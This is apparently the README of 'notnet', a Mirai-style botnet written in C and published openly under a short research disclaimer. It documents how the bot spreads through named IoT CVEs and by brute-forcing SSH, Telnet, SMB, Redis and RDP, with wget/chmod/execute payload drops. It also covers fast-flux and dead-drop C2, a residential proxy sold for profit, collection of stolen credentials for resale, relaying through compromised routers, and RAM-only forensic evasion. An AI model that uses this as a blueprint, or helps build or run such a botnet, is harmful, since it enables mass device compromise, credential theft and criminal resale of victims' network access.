# notnet — Modern Mirai-Style Botnet

A research-purpose botnet written in pure C, designed to replicate across heterogeneous systems using a blend of classic and modern techniques.

## Design Goals

- **Pure C**: Compiles and runs on any system with a C compiler and network stack
- **Hybrid C2**: Multi-protocol C2 (IRC + HTTP + WebSocket) for maximum compatibility
- **CVE-first spreading**: pluggable known-CVE exploitation modules for IoT/edge
  devices (primary vector), brute-force SSH/Telnet/SMB/Redis/RDP (fallback)
- **Fast-flux + dead-drop C2 resilience**: rotating multi-A-record C2
  resolution (`flux_enabled`) and dead-drop endpoint bootstrapping via
  legitimate services — the takedown-resilience mechanisms that survived
  adversarial review. A Kademlia-style P2P daisychain was explicitly
  dropped: DHT overlays are crawlable and pollutable, and modern P2P
  botnets remain niche. **ORB-style relay is implemented** (single-hop;
  multi-hop chaining planned — see the Relay section below).
- **On-target compilation**: supported as an update fallback — the bot can
  fetch a verified source bundle and compile locally (see Payload Delivery)
- **Modern + classic**: systemd persistence, IRC command channels, CVE
  exploitation, and brute-force spreading

## Architectures

The Makefile provides build targets for:

- x86_64
- ARM32 (armv7l)
- ARM64 (aarch64)
- RISC-V (riscv64)

ARMv6l, MIPS/MIPS64, and PowerPC are not currently supported by the
repository build system. Do not treat them as available targets.

## C2 Protocols

| Protocol  | Status | Auth |
|-----------|--------|------|
| IRC       | Deprecated (legacy) | Nick allowlist (`irc_auth_nicks`) + optional `irc_pass` |
| HTTP      | Implemented | Shared secret echo (`c2_secret`) — commands rejected without it |
| WebSocket | Implemented (RFC 6455 handshake) | Shared secret echo (`c2_secret`) |

- IRC commands are accepted only from nicks in the `irc_auth_nicks` allowlist.
- HTTP and WebSocket commands are accepted only from responses that echo the
  configured `c2_secret`. With no secret configured, HTTP/WS commands are
  rejected (fail-closed).
- **IRC is deprecated** (off by default; re-enable with `irc_enabled=1`). A
  bespoke IRC channel is trivially sinkholed — a single network operator can
  seize the channel and silently drop the botnet — and the IRC protocol no
  longer provides meaningful resilience. The code is kept for compatibility,
  but the primary channels are HTTP/WS with **dead-drop resolution**
  (`dead_drop_url=`) as the bootstrap, which routes C2 endpoints through
  legitimate chat/text infrastructure instead of a dedicated, takedown-able
  channel.
- All three channels support TLS 1.2+ when built with `make TLS=1` and a
  certificate pin is configured (see Encryption).
- All three channels support **fast-flux C2** (`flux_enabled=1`): the bot
  resolves every A record of each C2 hostname, rotates the active IP every
  `flux_ttl` seconds (default 60), re-resolves at the same low TTL, and fails
  over to the next IP automatically on connect or recv timeout — a
  sinkholed or blocked IP is abandoned on the next attempt. Disabled by
  default (single hostname resolution, as before).
- All three channels support **dead-drop C2 resolution** (`dead_drop_url=`):
  at boot and every `dead_drop_interval` seconds the bot fetches an opaque
  C2-endpoint blob from a legitimate service (Telegram channel, Steam
  profile, pastebin-style HTTP) and, **only when it echoes the shared
  `c2_secret`**, applies it as an override for the C2 endpoints — mirroring
  how modern infostealers (e.g. Vidar, Masad) resolve C2 through legitimate
  chat/text infrastructure. The fetch is plaintext HTTP (the default build
  has no TLS), so trust comes from the secret echo, not the transport. A
  failed, malformed, or unverified fetch leaves the static config as the
  fallback (fail-closed). Disabled by default.

## Spreading Vectors

CVE-first: known-CVE exploitation modules run before brute-force spreaders in
every scan/spread dispatch. Default-credential Telnet brute-force is demoted to
a fallback vector — it only runs when no CVE module fires.

| Target  | Method |
|---------|--------|
| IoT/edge (CVE-first) | Known-CVE exploitation modules with probe → verify → payload-drop phases: CVE-2024-3721 (TBK DVR-4104/4216), CVE-2017-17215 (Huawei HG532), CVE-2021-35395 (Realtek Jungle SDK) — primary vector |
| SSH     | Password brute-force, post-exploitation payload deployment (banner-based; fallback vector, effective against legacy/test services, not modern key-exchange SSH) |
| Telnet  | Default-credential password brute-force, post-exploitation payload deployment (banner-based; **FALLBACK** vector — demoted from primary, effective against legacy/test services) |
| SMB     | Login brute-force (auth confirmation only; fallback) |
| Redis   | Unauthenticated write + authenticated brute-force, SSH key injection (`redis_ssh_key` required; fallback) |
| RDP     | Brute-force, credential reuse (auth confirmation only; fallback) |

### Known-CVE exploitation modules (#83)

CVE modules are pluggable and three-phase, mirroring how modern IoT botnets
(Satori, Moobot) structure known-CVE spreading:

- **probe** — passive family fingerprint (banner/HTTP markers, service
  response), no exploit traffic;
- **verify** — non-destructive command-execution proof (a unique token echoed
  back, or the vulnerable service accepting an injection-shaped request). A
  payload is **never** dropped without a positive verify;
- **drop** — payload delivery over the confirmed channel (`wget` → `chmod` →
  execute, same delivery URL as the brute-force vectors).

Fail-safe by construction: every phase is time-bounded, all buffers are
bounded, no `system()`/`popen()` (raw sockets only), and module traffic is
sent only against ports the module targets. Add new checks by extending the
module table in `src/spread.c` (`cve_modules[]`) — one struct entry per CVE.

The Redis SSH key injection vector requires a real SSH public key configured
via `redis_ssh_key=` (config) or `NOTNET_REDIS_SSH_KEY` (env). The old literal
placeholder is rejected.

## Payload Delivery

1. Direct binary download from C2 (preferred), verified by a SHA-256 pin
   (`payload_sha256=` config / `NOTNET_PAYLOAD_SHA256` env). Update is refused
   without a pin or on hash mismatch (fail-closed).
2. On-target compilation (fallback, when binary download fails or the binary
   pin mismatches):
   - The bot fetches the source bundle from the C2 (`payload_source_url=`,
     default `http://<http_server>:<http_port>/notnet-src.tar`).
   - The tarball must match `payload_source_sha256=` (config /
     `NOTNET_PAYLOAD_SOURCE_SHA256` env) — fail-closed, same as the binary.
   - The tarball is extracted safely (path traversal rejected), compiled with
     the first available compiler (gcc/cc/musl-gcc/clang), static link first,
     dynamic fallback, under a 120s timeout.
   - Produce the bundle with `make dist-src` (prints the pin to set).
   - Enabled with `payload_compile_enabled=1`.

## Monetization (Residential SOCKS5 Proxy + Credential Logs)

The bot monetizes its **network position** rather than its compute — the
spiritual successor to mining and the pattern that drove **911 S5 to 19
million infected devices before its 2024 takedown** (ZeroAccess's successor).
Renting the bot's residential IP as an egress proxy has better margins and
far lower noise than cryptomining.

### Residential proxy

When enabled, the bot runs a **SOCKS5 forward proxy** (RFC 1928) that accepts
CONNECT requests and forwards them to any IPv4 or domain destination. A
client authenticates with the per-bot `proxy_token` (RFC 1929 user/pass —
the token is the password), then its traffic exits through the bot's IP. The
C2 aggregates heartbeat proxy status into a **residential-proxy inventory**.

- **Auth is mandatory and fail-closed.** The proxy refuses to bind without a
  configured `proxy_token`; a client that offers no user/pass method is
  rejected. Password comparison is constant-time (no timing side-channel).
- **Bounded by design.** The accept loop runs in its own pthread (never
  blocks the C2 loop), each connection gets a detached worker (capped at
  32), tunnel buffers are 4KB, and handshake/tunnel I/O is select-bounded.
- **Destinations:** IPv4 and domain names supported; IPv6 rejected.
- **Operator control:** `proxy on [port]` / `proxy off` at runtime, or set
  `proxy_enabled=1` to start at boot. `config_set proxy_enabled=1` also
  starts it live.
- **Heartbeat** reports `proxy_on` + `proxy_port` so the C2 can build the
  inventory.

### Credential-log collection (smash-and-grab log-sale)

2026 judgment: per-victim monetization (MitB banking fraud, click fraud) lost
to fraud analytics and MFA — **the market rewarded speed instead: steal
everything, sell the log, let the buyer monetize.** Credential-log sales are
the direct descendant of Zeus-era theft, now smash-and-grab (the Vidar /
RedLine / Lumma-stealer MaaS model).

- **Harvest.** Every successful brute-force credential (SSH, Telnet, SMB,
  Redis `AUTH`, RDP) is buffered in a bounded, mutex-protected queue — one
  line per entry, `proto|ip|port|user|pass`. Redis's unauthenticated exploit
  records nothing (there is no credential to sell); the verified `AUTH`
  password is what gets logged.
- **Bounded + DROP-NEWEST.** The buffer is a fixed 256×256 array that never
  grows; when full, a fresh credential is discarded with a `log_warn` rather
  than evicting older (as-yet-unexfiltrated) harvest.
- **Exfil.** `exfil_creds` streams the whole log to the C2 in chunks (same
  chunking path as `exfil`) then clears the buffer, so capacity resets for
  the next harvest. The command is gated by the same shared-secret C2 auth as
  every other command.
- **Inventory.** Heartbeat reports `cred_count` so the C2 tracks how much
  log it can sell at any moment.
- **Sell the log.** The C2 operator aggregates per-bot harvests into a
  combined log (service, host, username, password) and sells it; the buyer
  monetizes via credential stuffing / account takeover / access resale.

## Relay (ORB-style, Volt Typhoon pattern)

2026 judgment — the modern synthesis: **use the compromised devices
themselves as relay infrastructure**, the state-actor ORB (Operational
Relay Box) pattern where Volt Typhoon proxied operations through SOHO
routers geographically near victims. Instead of C2/spread traffic
originating from the bot's own IP, an operator routes it through a chain
of bots (TCP CONNECT-style forwarding between peers). This complements
fast-flux (C2 resilience) and the residential proxy (monetization) and is
**explicitly NOT a DHT** — no peer discovery, no overlay, nothing to
crawl or pollute.

- **Single-hop relay (implemented).** Each bot can run a
  token-authenticated relay listener (`relay_enabled=1` + `relay_token`,
  fail-closed). A client sends one line
  `RELAY <token> <target_host> <target_port>`; the relay bot connects to
  the target and splices raw bytes bidirectionally
  (`client → bot:relay_port → target host:port`). The accept loop runs in
  its own pthread (never blocks the C2 loop), each connection gets a
  detached worker (capped at 32), tunnel buffers are 4KB, and
  handshake/tunnel I/O is select-bounded — the same structure as the
  SOCKS5 proxy. Token comparison is constant-time; the token is never
  logged. IPv4/domain targets; IPv6 rejected.
- **Per-target relay selection.** `relay <target> <port> [via
  <host>:<port>]` probes reachability and RTT to a target — directly
  (baseline) or through a relay bot (single hop). The operator probes
  candidate relays and prefers the one closest to the target (the ORB
  pattern). Heartbeats report `relay_on` + `relay_port` so the C2 can
  build a relay inventory.
- **Operator control:** `relay on [port]` / `relay off` at runtime, or
  set `relay_enabled=1` to start at boot. `config_set relay_enabled=1`
  also starts it live.
- **Multi-hop chaining (planned, not implemented).** A chain composes
  these hops — each hop's "target" is the next relay bot's listener — but
  the multi-hop wiring and relay-selection policy are future work. This
  version is a working single-hop building block only.

## Plugin System (loader/plugin split)

2026 judgment — the loader/plugin split (Cutwail, Emotet, Bredolab)
**became the industry structure**: a small loader that fetches modules
post-infection, with the C2 dispatching capabilities by name. Modularity-
as-a-service survived takedowns (law enforcement now targets it as such —
Operation Endgame dismantled the IcedID/Bumblebee/SystemBC module
ecosystem in 2024, and the ecosystem still reconstituted); monolithic
single-purpose bots did not. The core bot should stay minimal; new
capabilities (stealer, worm, proxy) are pushed after infection, not baked
into the binary.

- **Built-in plugin registry (implemented).** v1 ships the framework with
  compile-time linked plugins, managed by the `plugin` C2 command:

  | Plugin | Capability | run action |
  |--------|-----------|------------|
  | `spread`   | Multi-vector spreader + CVE modules (#83) | one `spread_local()` cycle |
  | `proxy`    | Residential SOCKS5 forward proxy (#89) | `proxy_start()` (token-gated, fail-closed) |
  | `relay`    | ORB-style single-hop relay (#91) | `relay_start()` (token-gated, fail-closed) |
  | `cred-log` | Credential-log harvest buffer (#90) | passive — `plugin status` reports the buffered count |
  | `byovd`    | BYOVD defense scaffold (#94) | **defensive-only research scaffold** — registered, every op refuses; no driver-loading code ships |

  Lifecycle: `plugin <name> load|run|unload` plus `plugin status` (list
  the whole registry with loaded state) and `plugin <name> status`
  (single plugin). Because v1 plugins are compile-time linked, `load`
  only flips registry state; `run` executes the capability (e.g. starts
  the proxy/relay accept thread) and `unload` tears it down. Existing
  module behavior is unchanged — the plugin layer is a thin wrapper over
  each module's own entry points, and the boot-time `proxy_enabled` /
  `relay_enabled` logic still applies. `plugin_enabled=0` (config or
  `config_set`) disables the framework entirely; the command is refused.

- **Remote plugin fetch (planned, not implemented).** The full
  Bredolab/Emotet pattern is a `plugin fetch <url>` command that pulls a
  plugin (standalone binary in an allowlisted dir, or ELF shared object)
  from the C2 and registers it dynamically. v1 deliberately does **not**
  implement dlopen of remotely fetched objects: loading attacker-supplied
  code via `dlopen` is a portability and code-signing/trust decision the
  repo will revisit in a future issue. When implemented, the fetch MUST
  use the same fail-closed SHA-256 pinning as the payload path
  (`payload_sha256` pattern) — a plugin whose hash does not match its
  pinned value is discarded, never executed.

### Defense Neutralization (BYOVD)

2026 judgment — kernel rootkits as implemented (driver replacement,
SSDT hooks, ADS hiding) **lost to platform hardening**: signature
enforcement, Secure Boot, HVCI, and PatchGuard made custom kernel
stealth a losing bet. The *objective* (kernel-level neutralization of
security tooling) is now commodity via **BYOVD** (bring-your-own-
vulnerable-driver): drop a legitimately-signed but vulnerable third-
party driver and abuse it — ESET catalogued ~90 EDR killers, 54 abusing
a shared pool of 35 legitimately signed drivers — and even that is a
cat-and-mouse game (the vulnerable-driver blocklist quarantined a
dropped driver 127 ms after it hit disk in a 2026 case).

- **notnet ships NO driver-loading code.** The `byovd` plugin is a
  **defensive-only research scaffold**: it registers in the built-in
  registry but refuses every operation with a clear log, and boot
  auto-load leaves it unloaded. This repo's output is documentation +
  detection, never deployment — see `references/byovd.md` for the full
  research note and a Windows defender checklist (vulnerable-driver
  blocklist, HVCI/Memory Integrity, WDAC/App Control, driver-signing
  enforcement, driver-load telemetry).
- **`byovd_guard` config flag** (default 0): the defensive posture
  toggle. When set (config file or `config_set byovd_guard=1`), the
  plugin's load callback reports that BYOVD-style driver abuse is
  **blocked**. Reporting only — there is no capability to enable.

## Operations (Disposable Infrastructure + Affiliate Ops)

2026 judgment — the deepest correction: **botnets poured engineering into
surviving takedown technically (DGA, P2P, rootkits), and nearly all of it
was outpaced.** Qakbot's 2023 infrastructure takedown and the 2024/2025
Operation Endgame dismantlements show the same pattern: sinkholing the C2
kills the fleet regardless of how clever the channel was. What actually
survives takedown is the **organization** — the MaaS brand, the affiliate
relationships, the source code (Mirai's most durable act wasn't any
technical feature, it was publishing the source). This repo therefore
builds *organizational* resilience: disposable infrastructure that
assumes takedown and rebuilds fast, and affiliate-structured operations
where one affiliate's takedown does not kill the fleet.

- **Disposable C2 rotation (implemented).** The bot dials its HTTP C2
  through a bounded fallback chain: the primary endpoint (`http_server` /
  `http_port`, possibly repointed by a dead-drop) plus up to 4 static
  backups (`c2_backup_1` … `c2_backup_4 = host:port`, contiguous from 1).
  After 3 consecutive connect failures the bot rotates to the next
  endpoint, logs the switch with the reason, and keeps going — capped at
  16 total rotations per process so a fully dead fleet cannot churn
  forever. `rotate` forces a switch immediately (manual failover during a
  takedown); `config_set c2_backup_<n>=host:port` reconfigures the chain
  live. Rotation is a separate layer **above** the fast-flux resolver:
  flux rotates IPs within one hostname, rotation switches the whole
  endpoint. A verified dead-drop repoint resets the failure streak and
  returns to the primary, so a fresh drop is tried before any static
  backup applies.
- **Affiliate/operator tags (implemented).** `bot_tag` (bounded 64 chars)
  is the affiliate-model primitive — an operator or campaign identifier
  reported in every heartbeat (`"tag":"..."`). The C2 can attribute bots
  to affiliates, build per-affiliate inventories, and tear down or
  re-provision one affiliate's capacity without touching the rest of the
  fleet. The per-affiliate credentials/keys separation (each affiliate
  gets its own `c2_secret` / tokens so one affiliate's exposure does not
  compromise the fleet) follows the same model and is configured per-bot.
- **`kill` command (implemented).** The flip side of rotation — when an
  affiliate hands capacity back (or a campaign is retired under pressure),
  `kill` wipes the credential-log buffer (`spread_creds_drain` + zeroed
  copy), stops the proxy/relay/plugins via their stop callbacks, and exits
  with status 0 through the normal cleanup path. One-way door: no un-kill.
- **Affiliate dashboard (future work, out of scope for a C bot).** The
  C2-side aggregation layer — a per-affiliate control panel tracking
  bot_tag inventories, rotation state per bot, credential-log volume, and
  per-affiliate kill/re-provisioning — is operator tooling, not bot code.
  The bot side (this repo) already emits everything the dashboard needs:
  tagged heartbeats, rotation logging, and clean capacity hand-back.
- **Source stays public.** Per the judgment, published source is the most
  durable resilience mechanism — the repo is MIT-licensed and public by
  design.

## Commands

Commands are issued via the C2 channels (IRC PRIVMSG or HTTP/WS JSON with the
shared secret). The command queue is rate-limited to 10 commands/second.

| Command | Syntax | Status |
|---------|--------|--------|
| spread  | `spread <ip>:<port>` | Implemented — CVE-first: run known-CVE modules for the port, then brute-force fallback (22/23/445/6379/3389) |
| scan    | `scan <subnet>` / `scan <ip>[:<port,...>]` | Implemented — port scan / service fingerprinting, results returned to C2 |
| exec    | `exec <command>` | Implemented — runs one of a strict allowlist (`uname`, `date`, `uptime`, `whoami`, `id`, `ls`, `ifconfig`, `hostname`, `netstat`, `ps`), no shell |
| download | `download <url> [path]` | Implemented — fetch URL to a local path |
| upload  | `upload <path> [remote_path]` | Implemented — upload a file to the C2 |
| exfil   | `exfil <path>` | Implemented — read a file and stream it to the C2 in chunks |
| exfil_creds | `exfil_creds` | Implemented — stream the buffered credential-log harvest (successful brute-force creds) to the C2 in chunks, then clear the buffer |
| update  | `update [url]` | Implemented — download + SHA-256 verify + install new binary |
| reboot  | `reboot` | Implemented — sync + reboot the target |
| sleep   | `sleep <seconds>` | Implemented — set scan interval (clamped 1–3600) |
| config_set | `config_set <key>=<value>` | Implemented — allowlisted runtime config keys |
| proxy   | `proxy on [port]` / `proxy off` | Implemented — start/stop the residential SOCKS5 forward proxy (requires `proxy_token`) |
| relay   | `relay on [port]` / `relay off` / `relay <target> <port> [via <host>:<port>]` | Implemented — start/stop the token-authenticated ORB-style relay listener (requires `relay_token`), or probe a target's reachability/RTT directly vs. through a relay bot (per-target relay selection, single hop) |
| plugin  | `plugin status` / `plugin <name> load\|run\|unload\|status` | Implemented — loader/plugin framework: dispatch built-in plugins by name (spread, proxy, relay, cred-log; byovd is a defensive-only research scaffold that refuses all ops). Remote fetch of shared-object plugins is future work |
| rotate  | `rotate` | Implemented — manually advance the disposable C2 rotation chain (primary + `c2_backup_<n>`); does not consume the automatic-churn budget |
| kill    | `kill` | Implemented — affiliate capacity hand-back: wipe the credential-log buffer, stop proxy/relay/plugins via their stop callbacks, exit 0 (one-way door) |
| status  | — | Implemented — heartbeat reports version, hostname, uptime, scan count, credential-log count, proxy status, relay status, affiliate tag |

## Configuration

The bot loads config from `/etc/notnet.conf` (key=value format):

| Key | Default | Description |
||-----|---------|-------------|
|| `irc_server` | `irc.notnet.net` | IRC C2 server |
|| `irc_port` | `6697` | IRC C2 port |
|| `irc_channel` | `#notnet` | IRC channel to join |
|| `irc_pass` | *(none)* | IRC password (or `NOTNET_IRC_PASS` env var) |
|| `irc_auth_nicks` | *(none)* | Comma-separated authorized operator nicks |
|| `irc_enabled` | 0 | 0/1 — IRC C2 is **deprecated** (trivially sinkholed; superseded by dead-drop resolution). Off by default; set 1 to re-enable the legacy channel |
|| `http_server` | `api.notnet.net` | HTTP C2 server |
|| `http_port` | `443` | HTTP C2 port |
|| `http_path` | `/api/v1/bot` | HTTP C2 path |
|| `http_user_agent` | `notnet/<ver>` | HTTP User-Agent |
|| `http_enabled` | auto | 0/1 — explicitly enable/disable HTTP C2 |
|| `ws_server` | `ws.notnet.net` | WebSocket C2 server |
|| `ws_port` | `443` | WebSocket C2 port |
|| `ws_path` | `/ws/v1/bot` | WebSocket C2 path |
|| `ws_enabled` | auto | 0/1 — explicitly enable/disable WS C2 |
|| `flux_enabled` | `0` | 0/1 — fast-flux C2: resolve all A records of each C2 hostname, rotate the active IP every `flux_ttl` seconds, fail over to the next IP on connect/recv timeout |
|| `flux_ttl` | `60` | Seconds between flux re-resolution + IP rotation (1–3600) |
|| `dead_drop_url` | *(none)* | Dead-drop C2 endpoint: a pastebin-style HTTP URL hosting the endpoint blob. Fetched at boot and every `dead_drop_interval` s; applied only if the blob echoes `c2_secret` |
|| `dead_drop_interval` | `300` | Seconds between dead-drop re-resolution (30–86400) |
|| `proxy_enabled` | `0` | 0/1 — run the residential SOCKS5 forward proxy (monetizes the bot's network position). Requires `proxy_token` or the proxy refuses to bind (fail-closed) |
|| `proxy_port` | `1080` | Port the SOCKS5 proxy listens on (1–65535) |
|| `proxy_token` | *(none)* | Password clients must present (RFC 1929) to use the proxy. No default — the proxy will not start without it (or `NOTNET_PROXY_TOKEN` env var) |
|| `relay_enabled` | `0` | 0/1 — run the ORB-style relay listener (Volt Typhoon pattern: proxy operations through compromised edge devices near the target). Requires `relay_token` or the relay refuses to bind (fail-closed) |
|| `relay_port` | `1081` | Port the relay listener binds (1–65535) |
|| `relay_token` | *(none)* | Shared fleet token relay clients must present (`RELAY <token> <target> <port>`). No default — the relay will not start without it (or `NOTNET_RELAY_TOKEN` env var). Single-hop only; multi-hop chains are planned, and this is not a DHT |
|| `plugin_enabled` | `1` | 0/1 — loader/plugin framework: bootstrap the built-in plugin registry (spread, proxy, relay, cred-log) at boot and enable the `plugin` C2 command. 0 disables it; the command is refused |
|| `byovd_guard` | `0` | 0/1 — BYOVD defense posture toggle: when set, the `byovd` plugin's load callback reports that BYOVD-style driver abuse is blocked. Reporting only — no driver-loading code exists in this repo (defensive scaffold, see `references/byovd.md`). Also settable live via `config_set byovd_guard=1` |
|| `c2_backup_1` … `c2_backup_4` | *(none)* | Disposable-infrastructure C2 rotation: backup HTTP C2 endpoints as `host:port`, contiguous from `c2_backup_1` (a gap leaves later entries unreachable). After 3 consecutive connect failures the bot rotates through the chain (primary → backups, wrapping), capped at 16 total rotations per process. Also settable live via `config_set c2_backup_<n>=host:port` |
|| `bot_tag` | *(none)* | Affiliate/operator tag (max 64 chars): the affiliate-model primitive, reported in every heartbeat (`"tag":"..."`) so the C2 can attribute bots to affiliates. Also settable live via `config_set bot_tag=...` |
|| `c2_secret` | *(none)* | Shared secret echoed by C2; HTTP/WS commands are rejected without it (or `NOTNET_C2_SECRET` env var) |
|| `tls_cert_pin_sha256` | *(none)* | TLS server cert fingerprint pin; requires `make TLS=1` (or `NOTNET_TLS_CERT_PIN_SHA256` env var) |
|| `payload_sha256` | *(none)* | Expected SHA-256 of downloaded payload; update is refused without a match (or `NOTNET_PAYLOAD_SHA256` env var) |
|| `payload_compile_enabled` | `0` | 0/1 — allow on-target compilation fallback |
|| `payload_source_url` | auto | URL of the source bundle (default `http://<server>:<port>/notnet-src.tar`) (or `NOTNET_PAYLOAD_SOURCE_URL` env var) |
|| `payload_source_sha256` | *(none)* | Expected SHA-256 of the source bundle; compile refused without a match (or `NOTNET_PAYLOAD_SOURCE_SHA256` env var) |
|| `redis_ssh_key` | *(none)* | SSH public key injected into Redis authorized_keys (or `NOTNET_REDIS_SSH_KEY` env var) |
|| `scan_interval` | `30` | Seconds between scan cycles |
|| `heartbeat_interval` | `60` | Seconds between heartbeats |
|| `ssh_enabled` | `1` | Enable SSH spreading |
|| `telnet_enabled` | `1` | Enable Telnet spreading |
|| `smb_enabled` | `1` | Enable SMB spreading |
|| `redis_enabled` | `1` | Enable Redis spreading |
|| `rdp_enabled` | `1` | Enable RDP spreading |
|| `persist_enabled` | `1` | 0/1 — 0 = RAM-only fileless mode: no persistence installed, Linux self-relaunch via memfd (or `NOTNET_PERSIST_ENABLED` env var) |

### Scan targets

By default the bot scans `192.168.1.0/24` each cycle (254 hosts). Override with:

```
scan_targets=192.168.1.0/24
scan_targets=10.0.0.0/24
```

Or use the legacy per-index format:
```
scan_target_0=192.168.1.0/24
scan_target_1=10.0.0.0/24
```

### Scan tuning

Control scan aggressiveness (defaults for production):

| Key | Default | Description |
||-----|---------|-------------|
|| `scan_timeout_ms` | `500` | Connection timeout in ms per host |
|| `scan_max_hosts` | `254` | Max hosts to scan per subnet |

For testing, use aggressive values:
```
scan_timeout_ms=50
scan_max_hosts=5
```

Set to empty or omit to use the default single /24 scan.

## Persistence

Automatically detects init system and installs:
- systemd service
- cron job
- SysV init script

Binary paths are validated against shell metacharacters before any installer
uses them (CWE-78 hardening); the cron job is installed via a temp file, never
shell interpolation.

### RAM-only fileless mode (`persist_enabled=0`)

Set `persist_enabled=0` (or `NOTNET_PERSIST_ENABLED=0`) to run fully
RAM-resident: no persistence is installed and, on Linux, the bot relaunches
itself from an anonymous `memfd_create()` file via `fexecve()` so the running
binary has no disk-backed executable (`/proc/self/exe` points into `/memfd`).
C2, spreading, and payload handling work identically in this mode; the
infection is simply lost on reboot.

**Reboot-loss is a feature, not a bug** — it is deliberate forensic evasion.
A RAM-only implant leaves nothing for disk-based forensics: no service unit,
no cron entry, no init script, and no binary on disk. On platforms without
`memfd_create` (non-Linux), the bot logs and continues disk-backed with
persistence still skipped.

`persist_enabled` is also accepted by the `config_set` C2 command (strict 0/1)
and takes effect on the next persistence install, e.g. a payload update.

## Encryption

- TLS 1.2+ for all three C2 channels (IRC, HTTP, WebSocket), enabled with
  `make TLS=1` plus a pinned server certificate fingerprint:
  `tls_cert_pin_sha256=<64 hex>` in config or `NOTNET_TLS_CERT_PIN_SHA256`
  env var. The peer certificate is verified before any data is exchanged.
- Default build is cleartext C2 (IRC, HTTP, WS).

## Building

```sh
make            # static x86_64 build, cleartext C2
make TLS=1      # dynamic build with OpenSSL TLS support
make build-armv7l / build-aarch64 / build-riscv64   # cross builds
make dist-src   # build the on-target compilation source bundle + pin
make clean
```

Requires: a C compiler, `-lpthread`; `make TLS=1` additionally requires
OpenSSL headers + `-lssl -lcrypto`.

## Testing

The repo ships a Docker-based test harness:

```sh
./tests/run-tests.sh no-net     # init + loop + shutdown, no network
./tests/run-tests.sh mock-c2    # IRC + HTTP C2 against local mocks
./tests/run-tests.sh all        # both scenarios
```

The mock scenario verifies IRC and HTTP command extraction, the shared-secret
auth gate, exec allowlist execution, and spread dispatch. Rebuild the Docker
image after any source change (`docker compose -f docker-compose.test.yml
build bot-mock-c2`).

## License

MIT

## Research Notice

> This botnet is designed for research purposes. Default configuration uses a 30-second
> sleep between scans to avoid aggressive network behavior. It is not intended for
> unsanctioned deployment on third-party systems.
